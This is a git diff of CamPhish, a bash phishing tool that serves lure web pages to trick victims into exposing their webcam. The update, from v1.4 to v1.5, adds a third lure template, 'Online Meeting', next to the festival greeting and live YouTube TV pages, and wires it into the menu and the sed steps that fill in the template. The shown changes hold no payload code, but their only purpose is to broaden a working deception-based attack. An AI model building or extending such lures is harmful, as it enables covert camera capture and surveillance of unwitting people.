@@ -1,5 +1,5 @@
 #!/bin/bash
-# CamPhish v1.4
+# CamPhish v1.5
 # Powered by TechChip
 # Credits goes to thelinuxchoice [github.com/thelinuxchoice/]
 
@@ -15,7 +15,7 @@ printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | 
 printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
 printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
 printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n"
-printf " \e[1;93m CamPhish Ver 1.4 \e[0m \n"
+printf " \e[1;93m CamPhish Ver 1.5 \e[0m \n"
 printf " \e[1;77m www.techchip.net | youtube.com/techchipnet \e[0m \n"
 
 printf "\n"
@@ -127,9 +127,11 @@ sed 's+forwarding_link+'$link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
 fi
 rm -rf index3.html
 
@@ -146,6 +148,7 @@ else
 printf "\n-----Choose a template----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
 default_option_template="1"
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
@@ -154,6 +157,8 @@ read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fe
 fest_name="${fest_name//[[:space:]]/}"
 elif [[ $option_tem -eq 2 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YouTube video watch ID: \e[0m' yt_video_ID
+elif [[ $option_tem -eq 3 ]]; then
+printf ""
 else
 printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
 sleep 1
@@ -268,8 +273,11 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 if [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
-else
+elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
+sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
+else
+sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index3.html
 sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
 fi
 rm -rf index3.html
